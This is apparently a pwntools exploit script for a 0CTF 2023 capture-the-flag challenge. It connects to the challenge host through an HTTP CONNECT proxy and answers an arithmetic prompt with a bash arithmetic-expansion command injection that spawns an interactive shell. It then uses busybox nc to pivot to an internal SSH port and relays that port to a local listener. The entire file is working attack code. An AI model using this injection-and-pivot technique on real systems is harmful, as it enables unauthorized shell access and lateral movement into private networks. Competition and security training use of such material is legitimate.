from pwn import *

#context.log_level = 'debug'

# nc -X connect -x instance.0ctf2023.ctf.0ops.sjtu.cn:18081 89xergbg93m6vbfj 1
r = remote('instance.0ctf2023.ctf.0ops.sjtu.cn', 18081)
r.send(b'CONNECT hqgbfqxkptyxjmj9:1 HTTP/1.0\r\n\r\n')
r.recvline() # b'HTTP/1.1 200 OK\r\n'
r.recvuntil(b'Now, write down the exam integrity statement here:\n')

r.send(b"I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment\n")

r.recvuntil(b'1 + 1 = ?\n')

r.send(b"a[$(bash -c 'bash -i 1>&2')]\n")
r.recvuntil(b'bash: no job control in this shell\n')

#r.send(b"busybox wget second\n")
#r.recvuntil(b'inet 10.')

r.send(b"busybox nc 10.10.222.5 22\n")
r.recvline()  # b'bash-5.1$ busybox nc 10.7.40.5 22\n'

l = listen(2222)
print("ssh ctf@localhost -p2222")
svr = l.wait_for_connection()
svr.connect_both(r)
